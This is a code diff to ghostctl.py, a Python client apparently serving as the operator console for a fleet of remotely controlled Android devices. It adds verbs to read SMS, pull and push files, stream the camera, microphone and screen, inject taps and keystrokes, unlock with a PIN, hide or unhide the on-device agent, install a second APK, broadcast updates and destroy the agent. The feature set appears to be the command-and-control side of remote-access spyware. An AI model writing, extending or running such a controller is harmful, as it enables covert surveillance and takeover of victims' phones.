@@ -3,15 +3,29 @@
 
 Usage:
   ghostctl.py list | status | devices
-  ghostctl.py -d <device_id> shell "echo hi"
-  ghostctl.py -d <device_id> files ls /sdcard
-  ghostctl.py -d <device_id> files get /sdcard/x.jpg
-  ghostctl.py -d <device_id> sms recent [N]
-  ghostctl.py -d <device_id> screen start|stop
-  ghostctl.py -d <device_id> loc once
-  ghostctl.py -d <device_id> update
-  ghostctl.py -d <device_id> destroy
-  ghostctl.py --all update          # broadcast
+  ghostctl.py -d <id> shell "echo hi"
+  ghostctl.py -d <id> files ls|tree|get|put ...
+  ghostctl.py -d <id> sms recent [N]
+  ghostctl.py -d <id> screen shot|record|live|stop|off ...
+  ghostctl.py -d <id> cam snap|live|stop ...
+  ghostctl.py -d <id> mic record|live|stop ...
+  ghostctl.py -d <id> brightness get|set <0-255>
+  ghostctl.py -d <id> volume get|set|mute|unmute [stream] [N]
+  ghostctl.py -d <id> wake
+  ghostctl.py -d <id> ui dump | ui find --text <t> | ui find --id <id>
+  ghostctl.py -d <id> tap <x> <y> | tap <node-id>     (longclick same)
+  ghostctl.py -d <id> type <text> | key <code> | swipe <x1> <y1> <x2> <y2>
+  ghostctl.py -d <id> unlock <pin> | arm | disarm
+  ghostctl.py -d <id> sidekick status|arm|disarm|ping|install [apk]
+  ghostctl.py -d <id> loc once
+  ghostctl.py -d <id> device info
+  ghostctl.py -d <id> hide | unhide | status | ping
+  ghostctl.py -d <id> update self|sidekick [--apk path]
+  ghostctl.py -d <id> destroy
+  ghostctl.py apks list
+  ghostctl.py apks add ghostd|ghosta <path>   # place APK in server/apks/
+  ghostctl.py --all update                        # broadcast
+  ghostctl.py streams                             # live stream cache
 
 JSON output by default; --pretty for humans.
 Env: GHOSTCTL_ADMIN_HOST / GHOSTCTL_ADMIN_PORT (default 127.0.0.1:8444).
@@ -19,11 +33,26 @@ Env: GHOSTCTL_ADMIN_HOST / GHOSTCTL_ADMIN_PORT (default 127.0.0.1:8444).
 import argparse
 import json
 import os
+import shutil
 import socket
 import sys
+from pathlib import Path
 
 ADMIN_HOST = os.environ.get("GHOSTCTL_ADMIN_HOST", "127.0.0.1")
 ADMIN_PORT = int(os.environ.get("GHOSTCTL_ADMIN_PORT", "8444"))
+
+BASE = Path(__file__).resolve().parent
+APK_DIR = BASE / "apks"
+APK_NAMES = {"self": "ghostd.apk", "ghostd": "ghostd.apk",
+             "sidekick": "ghosta.apk", "ghosta": "ghosta.apk"}
+
+# Verbs passed through verbatim to the daemon command router (the daemon
+# whitelist + client CommandHandler validate sub-verbs and args).
+PASS_THROUGH = {
+    "files", "sms", "screen", "cam", "mic", "brightness", "volume", "wake",
+    "ui", "tap", "longclick", "type", "key", "swipe", "unlock", "arm",
+    "disarm", "sidekick", "loc", "device", "hide", "unhide", "status", "ping",
+}
 
 
 def rpc(req):
@@ -45,30 +74,52 @@ def emit(data, pretty):
         print(json.dumps(data))
 
 
-# verb -> (action, arity handler). args validated by argparse, translated here.
+# verb -> (action, args). args validated by argparse, translated here.
 def build_args(ns):
     verb = ns.verb
     if verb == "shell":
         return "shell", [" ".join(ns.rest)]
-    if verb == "files":
-        if ns.rest[0] not in ("ls", "get"):
-            sys.exit("files: expected 'ls [path]' or 'get <path>'")
-        return "files", ns.rest
-    if verb == "sms":
-        if not ns.rest or ns.rest[0] != "recent":
-            sys.exit("sms: expected 'recent [N]'")
-        return "sms", ns.rest
-    if verb == "screen":
-        if not ns.rest or ns.rest[0] not in ("start", "stop"):
-            sys.exit("screen: expected 'start' or 'stop'")
-        return "screen", ns.rest
-    if verb == "loc":
-        if not ns.rest or ns.rest[0] != "once":
-            sys.exit("loc: expected 'once'")
-        return "loc", ns.rest
-    if verb in ("update", "destroy"):
-        return verb, []
+    if verb in PASS_THROUGH:
+        return verb, list(ns.rest)
     sys.exit(f"unknown verb {verb}")
+
+
+def parse_update(rest):
+    """update self|sidekick [--apk path] -> (target, apk_path_or_None)."""
+    r = list(rest)
+    target = apk = None
+    if r and r[0] in ("self", "sidekick"):
+        target = r.pop(0)
+    if r and r[0] == "--apk" and len(r) > 1:
+        apk = r[1]
+    elif r and not r[0].startswith("-"):
+        apk = r[0]  # positional path also accepted
+    if target not in ("self", "sidekick"):
+        sys.exit("update: expected 'self' or 'sidekick' (optionally --apk path)")
+    return target, apk
+
+
+def apks_cmd(rest):
+    """Local APK store management (server/apks/, gitignored)."""
+    sub = rest[0] if rest else "list"
+    if sub == "list":
+        APK_DIR.mkdir(exist_ok=True)
+        out = {}
+        for f in sorted(APK_DIR.glob("*.apk")):
+            out[f.name] = f.stat().st_size
+        emit({"apks_dir": str(APK_DIR), "apks": out}, False)
+        return
+    if sub == "add":
+        if len(rest) < 3 or rest[1] not in APK_NAMES:
+            sys.exit("apks add: expected 'apks add ghostd|ghosta <path>'")
+        name, src = APK_NAMES[rest[1]], Path(rest[2]).expanduser()
+        if not src.is_file():
+            sys.exit(f"no such file: {src}")
+        APK_DIR.mkdir(exist_ok=True)
+        shutil.copy2(src, APK_DIR / name)
+        print(f"stored {src} -> {APK_DIR / name}")
+        return
+    sys.exit("apks: expected 'list' or 'add ghostd|ghosta <path>'")
 
 
 def main():
@@ -78,12 +129,28 @@ def main():
     p.add_argument("--all", action="store_true", help="broadcast to all devices")
     p.add_argument("--pretty", action="store_true", help="human-readable output")
     p.add_argument("--wait", type=float, default=10.0, help="seconds to wait for result")
-    p.add_argument("verb", help="list|status|devices|shell|files|sms|screen|loc|update|destroy")
+    p.add_argument("verb", help="run ghostctl.py --help for the full verb list")
     p.add_argument("rest", nargs="*", help="verb arguments")
-    ns = p.parse_args()
+    ns, extra = p.parse_known_args()
+    # unknown option-looking args (e.g. client-side `--fps 5`, `--quality 60`)
+    # are passed through to the device verbatim
+    ns.rest = list(ns.rest) + extra
 
-    if ns.verb in ("list", "status", "devices"):
+    if ns.verb == "apks":  # local file management, no daemon needed
+        apks_cmd(ns.rest)
+        return
+    if ns.verb == "streams":
+        emit(rpc({"op": "streams"}), ns.pretty)
+        return
+    if ns.verb in ("list", "status", "devices") and not ns.device and not ns.all:
         emit(rpc({"op": "list"}), ns.pretty)
+        return
+    if ns.verb == "update":
+        target, apk = parse_update(ns.rest)
+        if not ns.all and not ns.device:
+            sys.exit("specify -d <device_id> or --all")
+        emit(rpc({"op": "update", "device_id": ns.device, "target": target,
+                  "apk": apk}), ns.pretty)
         return
 
     action, args = build_args(ns)
